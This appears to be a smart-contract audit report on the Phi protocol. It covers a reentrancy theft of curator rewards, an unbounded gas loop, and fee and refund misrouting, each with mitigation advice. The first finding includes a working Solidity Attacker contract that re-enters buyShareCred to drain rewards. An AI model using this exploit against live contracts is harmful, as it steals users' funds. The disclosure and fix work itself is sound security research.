## 🛑 High Risk Findings

### H-01: **Reentrancy vulnerability in `Cred::buyShareCred`**

**Location:** [Cred.sol:642](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/Cred.sol#L642)

**Description and impact**  
The `Cred::buyShareCred` function allows for reentrancy attacks as the refund payment is made prior to modifying the `lastTradestamp` for the curator [here](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/Cred.sol#L644). This allows a malicious contract to do the following in a single transaction:

1. Take out a flash loan.
1. Use the borrowed funds to buy shares with msg.value greater than what is required.
1. The contract's fallback function will be triggered when the refund is processed. During the fallback, it can use the shares to claim rewards using `CuratorRewardsDistributor::distribute`.
1. Sell the shares that were bought previously.
1. Repay the flash loan.

This attack is only viable if the creator and protocol fees, as well as gas fees are not too high. However, if executed it steals the rewards owed to existing curators as their shares are diluted by the attacker.

**Proof of Concept**  
A POC of the attack is shown below. Please note - a flash loan is not used in this POC but it could be easily adapted to use one.

```solidity
import { PRBTest } from "@prb/test/src/PRBTest.sol";
import { Test } from "forge-std/Test.sol";
import { console2 } from "forge-std/console2.sol";
import { ECDSA } from "solady/utils/ECDSA.sol";
import { LibClone } from "solady/utils/LibClone.sol";
import { Settings } from "./helpers/Settings.sol";
import { Cred } from "../src/Cred.sol";
import { ICred } from "../src/interfaces/ICred.sol";
import { ICuratorRewardsDistributor } from "../src/interfaces/ICuratorRewardsDistributor.sol";
import { IRewards } from "../src/interfaces/IRewards.sol";
import { BondingCurve } from "../src/curve/BondingCurve.sol";

contract TestCred is Settings {
    uint256 private constant GRACE_PERIOD = 14 days;
    uint256 private constant CLEARING_PERIOD = 30 days;
    string constant credUUID = "18cd3748-9a76-4a05-8c69-ba0b8c1a9d17";

    function _createCred(string memory credType, string memory verificationType, bytes32 merkleRoot) internal {
        vm.warp(START_TIME + 1);
        vm.startPrank(participant);
        uint256 credId = 1;
        uint256 supply = 0;
        uint256 amount = 1;
        uint256 expiresIn = START_TIME + 100;
        uint256 buyPrice = bondingCurve.getBuyPriceAfterFee(credId, supply, amount);
        string memory credURL = "test";
        bytes memory signCreateData = abi.encode(
            expiresIn, participant, 31_337, address(bondingCurve), credURL, credType, verificationType, merkleRoot
        );
        bytes32 createMsgHash = keccak256(signCreateData);
        bytes32 createDigest = ECDSA.toEthSignedMessageHash(createMsgHash);
        (uint8 cv, bytes32 cr, bytes32 cs) = vm.sign(claimSignerPrivateKey, createDigest);
        if (cv != 27) cs = cs | bytes32(uint256(1) << 255);

        cred.createCred{ value: buyPrice }(participant, signCreateData, abi.encodePacked(cr, cs), 100, 100);
        vm.stopPrank();
    }

    function test_attackCred() public {
        vm.warp(START_TIME + 1);

        _createCred("BASIC", "SIGNATURE", 0x0);
        uint256 rewardsAmount = 0.5 ether;
        curatorRewardsDistributor.deposit{value: rewardsAmount}(1, rewardsAmount);
        console2.log("Balance of cred ID: %s", curatorRewardsDistributor.balanceOf(1));

        address attackerWallet = makeAddr("attackerWallet");
        uint256 attackerInitialBalance = 10 ether;
        vm.deal(attackerWallet, attackerInitialBalance);
        vm.startPrank(attackerWallet);

        Attacker attacker = new Attacker(cred, curatorRewardsDistributor, phiRewards, attackerWallet, 1, 5);
        attacker.attack{value: attackerInitialBalance}();
        console2.log("Attacker balance increased by: %s", attackerWallet.balance - attackerInitialBalance);
    }
}

contract Attacker {
    ICred private immutable cred;
    ICuratorRewardsDistributor private immutable curatorRewardsDistributor;
    IRewards phiRewards;
    address private immutable destination;
    uint256 private immutable credId;
    uint256 private immutable amount;
    bool private reentered = false;

    constructor(
        ICred cred_,
        ICuratorRewardsDistributor curatorRewardsDistributor_,
        IRewards phiRewards_,
        address destination_,
        uint256 credId_,
        uint256 amount_
    ) {
        cred = cred_;
        curatorRewardsDistributor = curatorRewardsDistributor_;
        phiRewards = phiRewards_;
        destination = destination_;
        credId = credId_;
        amount = amount_;
    }

    function attack() external payable {
        uint256 buyPrice = cred.getCredBuyPriceWithFee(credId, amount);
        cred.buyShareCred{value: buyPrice + 1}(credId, amount, buyPrice);
    }

    receive() external payable {
        if (reentered) {
            return;   
        }
        reentered = true;
        curatorRewardsDistributor.distribute(credId);
        phiRewards.withdraw(destination, 0);
        cred.sellShareCred(credId, amount, 0);
        (bool succ,) = destination.call{value: address(this).balance}("");
        require(succ);
    }
}
```

**Recommended Mitigation Steps**  
The refund should be sent to the caller at the end of the Cred::_handleTrade function (after all state updates are made).

### H-01: **Funds may be irrecoverable from `CuratorRewardsDistributor` contract due to high gas cost of `distribute` function**

**Location:** [CuratorRewardsDistributor.sol:77-130](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/reward/CuratorRewardsDistributor.sol#L77-L130), [Cred.sol:680](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/Cred.sol#L680)

**Description and impact**  
The `distribute` function may use a significant amount of gas as it performs a loop over all curator addresses. `distribute` calls `Cred::getCuratorAddresses`. Then the internal function `Cred::_getCuratorData` is called. The size of this array is not bounded even though there is a supply cap. The reason is the length of the arrays stored in shareBalance never decrease, even when a curator sells all of their shares. Rather than removing the curator's address from the enumerable map, it simply sets the value to zero. Unlike the standard Solidity mapping type, the OpenZeppelin enumerable map does not remove the key from the data structure when we set the value at that key to zero. The array lengths stored in shareBalance will therefore be equal to the number of addresses to have ever owned shares for the cred ID in question, which is an unbounded number.

Additionally, it may be possible that there are a large number of addresses which hold shares and these addresses have zero balance on the PhiRewards contract. Thus, calling `CuratorRewardsDistributor::distribute` will result in a large number of sstore operations which set a zero to non-zero value. For example, with 500 addresses whose current PhiRewards balance is zero, we incur a gas cost of 500 * 20,000 = 10 million just for these sstore operations.

There is a risk that `CuratorRewardsDistributor::distribute` becomes prohibitively expensive to call or otherwise exceeds the gas limit per block, so it can no longer be called. Consequently, the funds would not be recoverable from the CuratorRewardsDistributor contract.

**Proof of Concept**  
A basic test can be run as demonstrated in which we iterate over a number of addresses. For each address, we buy a single share and then sell the share. The supply of shares is not changed by this action so it can be repeated many times. The code below has been run to test this behaviour:

```solidity
pragma solidity 0.8.25;

import { PRBTest } from "@prb/test/src/PRBTest.sol";
import { Test } from "forge-std/Test.sol";
import { console2 } from "forge-std/console2.sol";
import { ECDSA } from "solady/utils/ECDSA.sol";
import { LibClone } from "solady/utils/LibClone.sol";
import { Settings } from "./helpers/Settings.sol";
import { Cred } from "../src/Cred.sol";
import { ICred } from "../src/interfaces/ICred.sol";
import { BondingCurve } from "../src/curve/BondingCurve.sol";

contract TestCredGas is Settings {
    uint256 private constant GRACE_PERIOD = 14 days;
    uint256 private constant CLEARING_PERIOD = 30 days;
    string constant credUUID = "18cd3748-9a76-4a05-8c69-ba0b8c1a9d17";

    function setUp() public override {
        super.setUp();
        vm.warp(START_TIME + 1);

        _createCred("BASIC", "SIGNATURE", 0x0);

        uint256 iterations = 4000; // Modify this value to test different number of addresses
        uint256 time = block.timestamp;

        for (uint i = 0; i < iterations; i++) {
            address user = address(uint160(type(uint160).max - i));
            vm.deal(user, 1000 ether);
            vm.startPrank(user);

            uint256 buyPrice = bondingCurve.getBuyPriceAfterFee(1, 1, 1);
            uint256 maxPrice = bondingCurve.getBuyPriceAfterFee(1, 1, 2);

            cred.buyShareCred{ value: buyPrice }(1, 1, maxPrice);
            assertEq(cred.isShareHolder(1, user), true, "cred 1 is voted for by the user");

            time = time + 10 minutes + 1 seconds;
            vm.warp(time);
            uint256 minPrice = bondingCurve.getSellPriceAfterFee(1, 1, 1);
            cred.sellShareCred(1, 1, minPrice);
            assertEq(cred.isShareHolder(1, user), false, "cred 1 is not voted for by the user");

            vm.stopPrank();
        }

        curatorRewardsDistributor.deposit{value: 1 ether}(1, 1 ether);

        vm.startPrank(anyone);
    }

    function _createCred(string memory credType, string memory verificationType, bytes32 merkleRoot) internal {
        vm.warp(START_TIME + 1);
        vm.startPrank(participant);
        uint256 credId = 1;
        uint256 supply = 0;
        uint256 amount = 1;
        uint256 expiresIn = START_TIME + 100;
        uint256 buyPrice = bondingCurve.getBuyPriceAfterFee(credId, supply, amount);
        string memory credURL = "test";
        bytes memory signCreateData = abi.encode(
            expiresIn, participant, 31_337, address(bondingCurve), credURL, credType, verificationType, merkleRoot
        );
        bytes32 createMsgHash = keccak256(signCreateData);
        bytes32 createDigest = ECDSA.toEthSignedMessageHash(createMsgHash);
        (uint8 cv, bytes32 cr, bytes32 cs) = vm.sign(claimSignerPrivateKey, createDigest);
        if (cv != 27) cs = cs | bytes32(uint256(1) << 255);

        cred.createCred{ value: buyPrice }(participant, signCreateData, abi.encodePacked(cr, cs), 100, 100);
        vm.stopPrank();
    }

    function test_distributeRewardsLarge() public {
        curatorRewardsDistributor.distribute(1);
    }
}
```

The follow table shows the gas usage for the single invocation of the CuratorRewardsDistributor::distribute function - as reported by foundry using:

```
forge test --gas-report --match-test test_distributeRewardsLarge
```

| Number of Addresses | Gas Usage   |
|---------------------|-------------|
| 10                  | 159,421     |
| 1,000               | 7,827,892   |
| 2,000               | 15,608,802  |
| 3,000               | 23,424,868  |
| 4,000               | 31,276,091  |


Note: when calling `CuratorRewardsDistributor::distribute` in the test the supply is always equal to one even though many more addresses have bought/sold shares. By the time we get to 4000 addresses, the gas limit per block of 30 million is exceeded.

**Recommended Mitigation Steps**  
Rather than using a for loop over all curators, each curator could be made responsible for paying the gas cost associated with withdrawing their share of the rewards. This would require some refactoring in order to prevent users from withdrawing their share more than once.

A possible solution to solve this could take the form described below. Please note: this is pseudocode for a high-level solution design only and
does not consider all edge cases, rounding errors or implementation details.

Firstly, store a variable on the contract to track the total rewards per share earned over the lifetime of the contract:

```solidity
mapping(uint256 credId => uint256 rewardsPerShare) totalRewards;
```

During the `depositRewards` function, update the `totalRewards`:

```solidity
totalRewards += amount / total_number_shares_for_cred // total number of shares could be retrieved from the `Cred` contract
```

For each curator, we store these variables:

```solidity
struct RewardDetail {
    uint256 totalRewardsAtLastUpdate;
    uint256 sharesAtLastUpdate;
    uint256 pendingRewards;
}

mapping(address curator => mapping (uint256 credId => RewardDetail)) curatorRewards;
```

Then, whenever the curator's share balance is modified, we update as follows:

```solidity
RewardDetail storage rewardDetail = curatorRewards[curator][credId];
rewardDetail.pendingRewards += (totalRewards - rewardDetail.totalRewardsAtLastUpdate) * rewardDetail.sharesAtLastUpdate;
rewardDetail.totalRewardsAtLastUpdate = totalRewards;
rewardDetail.sharesAtLastUpdate = newShareBalance;
```

Note - the above logic would need to be used wherever the share balances changes (i.e. within the Cred contract's buy/sell functions).

Then the curator can withdraw the rewards for themselves through a function of the form:

```solidity
function withdrawRewards(address curator, uint256 credId) external {
    RewardDetail storage rewardDetail = curatorRewards[curator][credId];
    uint256 rewardAmount =
        rewardDetail.pendingRewards +
        (totalRewards - rewardDetail.totalRewardsAtLastUpdate) * rewardDetail.sharesAtLastUpdate;
    rewardDetail.pendingRewards = 0;
    rewardDetail.totalRewardsAtLastUpdate = totalRewards;

    // Now we can withdraw the `rewardAmount` (either a direct eth transfer or deposit to the `PhiRewards` contract)
}
```

Note that the solution described does not entitle the curator to rewards that were deposited prior to them purchasing the shares. This is unlike the existing implementation which allows for the curator to claim a share of previously deposited rewards as follows:

1. Rewards are deposited for the cred ID to the CuratorRewardsDistributor.
1. Curator purchases shares for the cred ID.
1. Curator is then paid out their share of rewards when CuratorRewardsDistributor::distribute is called.

The existing implementation does not overly incentivise the curators to hold onto their shares for any length of time. Instead, they can potentially get their rewards by simply buying/selling their shares at opportune times to receive the reward distributions

## ⚠️ Medium Risk Findings

### M-01: **`protocolFeeDestination` is not synchronized between PhiNFT1155 and PhiFactory**

**Location:** [PhiNFT1155.sol:43](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/art/PhiNFT1155.sol#L43)

**Description and impact**  
The `protocolFeeDestination` is set once in the initialize function of the `PhiNFT1155`. However, it is possible for this value to change on the `PhiFactory` via the `setProtocolFeeDestination` function. This does not align with the way the `artCreateFee` is synchronized between the two contracts, due to the fact it is fetched every time on [PhiNFT1155.sol:142](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/art/PhiNFT1155.sol#L142). This may cause financial loss as the funds will not be received by the intended address.

**Recommendation**  
Pass in the `protocolFeeDestination` as a function parameter, or otherwise this variable can be entirely removed from the `PhiNFT1155` and the logic for sending funds to the `protocolFeeDestination` can be moved to the `PhiFactory`. The latter approach may be preferrable as it simplifies the contract design.

**Submission details**: https://github.com/code-423n4/2024-08-phi-findings/issues/372

### M-02: **`PhiNFT1155::createArtFromFactory` sends refund to `PhiFactory` not to the user**

**Location:** [PhiNFT1155.sol:152](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/art/PhiNFT1155.sol#L152)

**Description and impact**  
`PhiNFT1155::createArtFromFactory` sends a refund back the `msg.sender` (i.e. the `PhiFactory`) rather than the account/user which is creating the art. This means the user may end up losing funds to the `PhiFactory`. These funds are then only withdrawable to the `protocolFeeDestination`.

**Recommendation:**  
Consider moving the refund logic back to the `PhiFactory`. From the context of the `PhiFactory` the `msg.sender` is the correct address to send the refund to.

**Submission details**: https://github.com/code-423n4/2024-08-phi-findings/issues/371
